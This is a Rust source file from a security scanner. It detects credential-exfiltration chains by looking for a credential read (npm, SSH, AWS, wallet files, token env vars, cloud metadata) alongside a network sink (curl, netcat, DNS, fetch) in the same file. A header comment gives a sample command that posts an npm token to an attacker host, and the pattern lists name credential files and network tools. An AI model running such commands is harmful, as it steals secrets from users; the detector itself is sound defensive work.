//! exfil_chain — Exfiltration chain detection (source + sink coexistence)
//!
//! Detects when a sensitive credential SOURCE and a network exfiltration SINK
//! coexist in the same file. Isolated source or isolated sink is at most SUSPICIOUS;
//! the combination = MALICIOUS intent.
//!
//! This is the first-class rule that captures attacks like:
//!   TOKEN=$(cat ~/.npmrc | ...); curl -X POST https://attacker.com -d "token=$TOKEN"
//!
//! Sources: credential file reads, sensitive env vars, IMDS access
//! Sinks: HTTP/HTTPS, DNS exfil, WebSocket, netcat, nslookup
//!
//! Deterministic: both patterns must be present in code. Mention in prose without
//! action (no sink) does NOT trigger. Isolated documentation does NOT trigger.

use crate::DefenderViolation;
use std::path::Path;

/// Credential sources — patterns that indicate sensitive data is being accessed.
/// Each entry is (regex_pattern, label_for_evidence).
const EXFIL_SOURCES: &[(&str, &str)] = &[
    // Credential files accessed via shell or read operations
    (
        r"(?:cat|grep|read|less|head|tail|cp|scp|rsync)\s+.*\.npmrc",
        "npm credential file read",
    ),
    (
        r"(?:cat|grep|read|less|head|tail|cp|scp)\s+.*\.pypirc",
        "pypi credential file read",
    ),
    (
        r"(?:cat|grep|read|less|head|tail|cp|scp)\s+.*\.netrc",
        "netrc credential file read",
    ),
    (
        r"(?:cat|grep|read|less|head|tail|cp|scp)\s+.*(?:id_rsa|id_ed25519|authorized_keys)",
        "SSH key file read",
    ),
    (
        r"(?:cat|grep|read|less|head|tail|cp|scp)\s+.*\.aws/credentials",
        "AWS credentials read",
    ),
    (
        r"(?:cat|grep|read|less|head|tail|cp|scp)\s+.*\.bash_history",
        "shell history read",
    ),
    (
        r"(?:cat|grep|read|less|head|tail|cp|scp)\s+.*\.zsh_history",
        "shell history read",
    ),
    (
        r"(?:cat|grep|read|less|head|tail|cp|scp)\s+.*\.fish_history",
        "shell history read",
    ),
    (
        r"(?:cat|grep|read|less|head|tail|cp|scp)\s+.*\.git-credentials",
        "git credentials read",
    ),
    (
        r"(?:cat|grep|read|less|head|tail|cp|scp)\s+.*\.cargo/credentials",
        "cargo credentials read",
    ),
    (
        r"(?:cat|grep|read|less|head|tail|cp|scp)\s+.*\.gem/credentials",
        "gem credentials read",
    ),
    (
        r"(?:cat|grep|read|less|head|tail|cp|scp|tar|zip)\s+.*wallet\.dat",
        "crypto wallet read",
    ),
    (
        r"(?:cat|grep|read|less|head|tail|cp|scp|tar|zip)\s+.*\.bitcoin/",
        "bitcoin wallet read",
    ),
    (
        r"(?:cat|grep|read|less|head|tail|cp)\s+.*Login[\\ ]Data",
        "browser credential read",
    ),
    // JS/TS: readFile of sensitive paths
    (
        r#"readFile(?:Sync)?\s*\(['""][^'"]*(?:\.npmrc|\.env|\.aws/credentials|id_rsa|id_ed25519|\.git-credentials|\.cargo/credentials|\.bash_history|\.zsh_history)"#,
        "JS credential file read",
    ),
    // Env var access (explicit, high-confidence credential names)
    (
        r"process\.env\.(?:AWS_SECRET_ACCESS_KEY|AWS_ACCESS_KEY_ID|GITHUB_TOKEN|GH_TOKEN|NPM_TOKEN|PYPI_TOKEN|SLACK_TOKEN|DISCORD_TOKEN|STRIPE_SECRET_KEY|OPENAI_API_KEY|ANTHROPIC_API_KEY|CLOUDFLARE_API_TOKEN|HEROKU_API_KEY|VERCEL_TOKEN|NETLIFY_AUTH_TOKEN|SENDGRID_API_KEY|TWILIO_AUTH_TOKEN)",
        "high-confidence credential env var",
    ),
    (
        r"process\.env\.[A-Z_]*(?:TOKEN|SECRET_KEY|API_KEY|PASSWORD|PASS\b)[A-Z_]*",
        "sensitive env var",
    ),
    (
        r#"os\.environ(?:\.get)?\s*[\[(]['"][A-Z_]*(?:TOKEN|SECRET_KEY|API_KEY|PASSWORD)[A-Z_]*['"]\s*[)\]]"#,
        "Python sensitive env var",
    ),
    (
        r#"os\.getenv\s*\(['"][A-Z_]*(?:TOKEN|SECRET_KEY|API_KEY|PASSWORD)[A-Z_]*['"]"#,
        "Python sensitive env var",
    ),
    // IMDS (cloud instance metadata — only malicious when combined with exfil sink)
    (r"169\.254\.169\.254", "IMDS access"),
    (r"metadata\.google\.internal", "GCP metadata access"),
    (r"fd00:ec2::254", "AWS IMDSv2 access"),
];

/// Exfiltration sinks — network channels used to send data out.
const EXFIL_SINKS: &[(&str, &str)] = &[
    (r"\bcurl\b", "curl network transfer"),
    (r"\bwget\b", "wget network transfer"),
    (r"\bnc\s+", "netcat network transfer"),
    (r"\bncat\s+", "ncat network transfer"),
    (r"\bnetcat\s+", "netcat network transfer"),
    (r"\bnslookup\s+", "DNS exfil (nslookup)"),
    (r"\bdig\s+[A-Za-z@+]", "DNS exfil (dig)"),
    (r"\bfetch\s*\(", "fetch() network call"),
    (r"\baxios\.", "axios network call"),
    (r"\bhttps?\.request\s*\(", "https.request network call"),
    (r"\bnew\s+WebSocket\s*\(", "WebSocket exfil channel"),
    (
        r"\brequests\.(?:post|get|put|patch|delete)\s*\(",
        "Python requests network call",
    ),
    (
        r"\burllib\.request\.urlopen\s*\(",
        "Python urllib network call",
    ),
    (r"\bsocket\.connect\s*\(", "socket.connect network call"),
    (r"\bnet\.connect\s*\(", "net.connect network call"),
    (r"\bsendto\s*\(", "socket sendto call"),
    // DNS subdomain exfil via variable interpolation
    (
        r"\$\{[A-Za-z_]\w*\}\.[a-zA-Z0-9.-]+\.[a-z]{2,}",
        "DNS subdomain exfil",
    ),
];

/// Scan file content for exfil_chain: sensitive SOURCE + network SINK coexisting.
/// Called directly from scan_content() — works on all file types.
/// Does NOT fire on isolated source (no sink) or isolated sink (no source).
pub fn scan_content(_path: &Path, content: &[u8]) -> Vec<DefenderViolation> {
    let text = match std::str::from_utf8(content) {
        Ok(s) => s,
        Err(_) => return Vec::new(),
    };

    // Find first matching source
    let source_match = EXFIL_SOURCES.iter().find_map(|(pattern, label)| {
        regex::Regex::new(pattern)
            .ok()
            .and_then(|re| re.find(text).map(|m| (m.as_str().to_string(), *label)))
    });

    let (source_evidence, source_label) = match source_match {
        Some(pair) => pair,
        None => return Vec::new(), // No sensitive source → not an exfil chain
    };

    // Find first matching sink
    let sink_match = EXFIL_SINKS.iter().find_map(|(pattern, label)| {
        regex::Regex::new(pattern)
            .ok()
            .and_then(|re| re.find(text).map(|m| (m.as_str().to_string(), *label)))
    });

    let (sink_evidence, sink_label) = match sink_match {
        Some(pair) => pair,
        None => return Vec::new(), // No network sink → not an exfil chain
    };

    // Both source and sink present → exfil chain confirmed
    vec![DefenderViolation {
        visitor: "exfil_chain".to_string(),
        line: 1,
        col: 1,
        evidence: format!("SOURCE: {} | SINK: {}", source_evidence, sink_evidence),
        decoded: None,
        message: format!(
            "Exfiltration chain detected: {} ({}) combined with {} ({}). \
            Sensitive credential data accessed and sent to external destination.",
            source_label, source_evidence, sink_label, sink_evidence
        ),
        suggestion: Some(
            "Remove the exfiltration sink or separate credential access from any network operations. \
            Credentials should only be passed to legitimate SDKs, never serialized and sent to external hosts."
                .to_string(),
        ),
    }]
}
